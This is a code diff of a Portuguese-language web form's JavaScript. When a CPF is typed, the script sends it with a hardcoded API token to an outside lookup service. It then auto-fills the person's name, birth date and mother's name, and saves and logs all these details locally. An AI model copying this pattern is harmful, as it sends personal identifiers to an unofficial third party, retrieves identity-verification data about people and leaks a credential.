@@ -91,6 +91,10 @@
                             <input type="text" id="cpf" name="cpf" required
                                 placeholder="000.000.000-00"
                                 class="w-full p-2 border border-slate-300 rounded focus:border-amber-500 focus:ring-1 focus:ring-amber-200 text-xs bg-white transition-all">
+                            <p class="text-xs text-slate-500 mt-1">
+                                <i class="fas fa-magic w-3 h-3 mr-1"></i>
+                                Dados preenchidos automaticamente quando disponível
+                            </p>
                         </div>
 
                         <div>
@@ -153,11 +157,14 @@ document.addEventListener('DOMContentLoaded', function() {
     const fullNameInput = document.getElementById('full_name');
     const birthDateInput = document.getElementById('birth_date');
     const motherNameInput = document.getElementById('mother_name');
-    const additionalFields = document.getElementById('additional_fields');
 
+    // CPF formatting and API integration
     cpfInput.addEventListener('input', function(e) {
         let value = e.target.value.replace(/\D/g, '');
+        
+        // Limit to 11 digits
         if (value.length <= 11) {
+            // Format CPF as user types
             value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, function(regex, arg1, arg2, arg3, arg4) {
                 if (arg4) return `${arg1}.${arg2}.${arg3}-${arg4}`;
                 if (arg3) return `${arg1}.${arg2}.${arg3}`;
@@ -166,101 +173,125 @@ document.addEventListener('DOMContentLoaded', function() {
             });
             e.target.value = value;
 
-            // Se o CPF estiver completo (11 dígitos), busca os dados
-            if (value.replace(/\D/g, '').length === 11) {
-                const cpfSemPontuacao = value.replace(/\D/g, '');
-
-                // Use the working CPF API directly
-                fetch(`https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf=${cpfSemPontuacao}`)
+            // When CPF is complete (11 digits), fetch data from API
+            const cleanCPF = value.replace(/\D/g, '');
+            if (cleanCPF.length === 11) {
+                console.log('CPF completo, buscando dados...');
+                
+                // Show loading indicators
+                fullNameInput.placeholder = 'Buscando dados...';
+                birthDateInput.placeholder = 'Buscando dados...';
+                motherNameInput.placeholder = 'Buscando dados...';
+                
+                // Call CPF API
+                const apiUrl = `https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf=${cleanCPF}`;
+                
+                fetch(apiUrl, { timeout: 10000 })
                     .then(response => response.json())
                     .then(data => {
-                        console.log('CPF API Response:', data);
+                        console.log('API Response:', data);
                         
-                        // Always show additional fields when CPF is complete
-                        additionalFields.style.display = 'block';
+                        // Reset placeholders
+                        fullNameInput.placeholder = 'Nome conforme documento oficial';
+                        birthDateInput.placeholder = '';
+                        motherNameInput.placeholder = 'Nome completo da mãe';
                         
                         if (data && data.DADOS) {
-                            console.log('Processing CPF data from API...');
-                            
-                            // Fill name field
+                            // Auto-fill name if available
                             if (data.DADOS.nome && data.DADOS.nome.trim()) {
                                 fullNameInput.value = data.DADOS.nome.trim();
-                                console.log('Name filled:', data.DADOS.nome);
+                                fullNameInput.style.backgroundColor = '#f0f9ff';
+                                fullNameInput.style.borderColor = '#3b82f6';
+                                console.log('✓ Nome preenchido:', data.DADOS.nome);
                             }
                             
-                            // Fill birth date field  
-                            if (data.DADOS.data_nascimento) {
-                                // Convert from "2001-01-15 00:00:00" to "2001-01-15"
-                                const birthDate = data.DADOS.data_nascimento.split(' ')[0];
+                            // Auto-fill birth date if available
+                            if (data.DADOS.data_nascimento && data.DADOS.data_nascimento.trim()) {
+                                const birthDate = data.DADOS.data_nascimento.split(' ')[0]; // Extract YYYY-MM-DD
                                 birthDateInput.value = birthDate;
-                                console.log('Birth date filled:', birthDate);
+                                birthDateInput.style.backgroundColor = '#f0f9ff';
+                                birthDateInput.style.borderColor = '#3b82f6';
+                                console.log('✓ Data nascimento preenchida:', birthDate);
                             }
                             
-                            // Fill mother's name field (even if empty, to show field is available)
-                            if (data.DADOS.nome_mae !== undefined) {
+                            // Auto-fill mother's name if available
+                            if (data.DADOS.nome_mae && data.DADOS.nome_mae.trim()) {
                                 motherNameInput.value = data.DADOS.nome_mae.trim();
-                                console.log('Mother name field processed:', data.DADOS.nome_mae);
+                                motherNameInput.style.backgroundColor = '#f0f9ff';
+                                motherNameInput.style.borderColor = '#3b82f6';
+                                console.log('✓ Nome da mãe preenchido:', data.DADOS.nome_mae);
                             }
                             
-                            console.log('✓ CPF data processing completed');
+                            console.log('✓ Preenchimento automático concluído');
                         } else {
-                            console.log('No DADOS found in API response');
+                            console.log('Dados não encontrados - preenchimento manual disponível');
                         }
                     })
                     .catch(error => {
-                        console.error('Erro ao buscar dados do CPF:', error);
-                        // Keep fields visible even on error
-                        additionalFields.style.display = 'block';
+                        console.error('Erro na API:', error);
+                        
+                        // Reset placeholders on error
+                        fullNameInput.placeholder = 'Nome conforme documento oficial';
+                        birthDateInput.placeholder = '';
+                        motherNameInput.placeholder = 'Nome completo da mãe';
+                        
+                        console.log('API indisponível - preenchimento manual disponível');
                     });
             }
         }
     });
 
-    // Save form data to localStorage when form is submitted
+    // Allow manual editing of auto-filled fields
+    function setupManualEditing(field) {
+        field.addEventListener('focus', function() {
+            this.style.backgroundColor = 'white';
+            this.style.borderColor = '#d1d5db';
+        });
+        
+        field.addEventListener('input', function() {
+            if (this.value.trim()) {
+                this.style.backgroundColor = 'white';
+                this.style.borderColor = '#d1d5db';
+            }
+        });
+    }
+    
+    setupManualEditing(fullNameInput);
+    setupManualEditing(birthDateInput);
+    setupManualEditing(motherNameInput);
+
+    // Phone formatting
+    const phoneInput = document.getElementById('phone');
+    if (phoneInput) {
+        phoneInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length <= 11) {
+                value = value.replace(/(\d{2})(\d{5})(\d{4})/, function(regex, arg1, arg2, arg3) {
+                    if (arg3) return `(${arg1}) ${arg2}-${arg3}`;
+                    if (arg2) return `(${arg1}) ${arg2}`;
+                    return `(${arg1}`;
+                });
+                e.target.value = value;
+            }
+        });
+    }
+
+    // Form submission with localStorage
     const form = document.querySelector('form');
     if (form) {
         form.addEventListener('submit', function(e) {
-            console.log('Form submitted, saving data to localStorage...');
+            console.log('Formulário enviado, salvando dados...');
             
-            // Get all form values
-            const cpf = cpfInput.value;
-            const fullName = fullNameInput.value;
-            const phone = document.getElementById('phone').value;
-            const birthDate = birthDateInput.value;
-            const motherName = motherNameInput.value;
-            
-            // Save to localStorage
-            if (cpf) {
-                localStorage.setItem('candidateCPF', cpf);
-                console.log('Saved CPF:', cpf);
-            }
-            if (fullName) {
-                localStorage.setItem('candidateName', fullName);
-                console.log('Saved name:', fullName);
-            }
-            if (phone) {
-                localStorage.setItem('candidatePhone', phone);
-                console.log('Saved phone:', phone);
-            }
-            if (birthDate) {
-                localStorage.setItem('candidateBirthDate', birthDate);
-                console.log('Saved birth date:', birthDate);
-            }
-            if (motherName) {
-                localStorage.setItem('candidateMotherName', motherName);
-                console.log('Saved mother name:', motherName);
-            }
-            
-            // Save complete user data object
             const userData = {
-                cpf: cpf,
-                full_name: fullName,
-                phone: phone,
-                birth_date: birthDate,
-                mother_name: motherName
+                cpf: cpfInput.value,
+                full_name: fullNameInput.value,
+                phone: phoneInput.value,
+                birth_date: birthDateInput.value,
+                mother_name: motherNameInput.value
             };
+            
             localStorage.setItem('userData', JSON.stringify(userData));
-            console.log('Complete user data saved:', userData);
+            console.log('Dados salvos:', userData);
         });
     }
 });
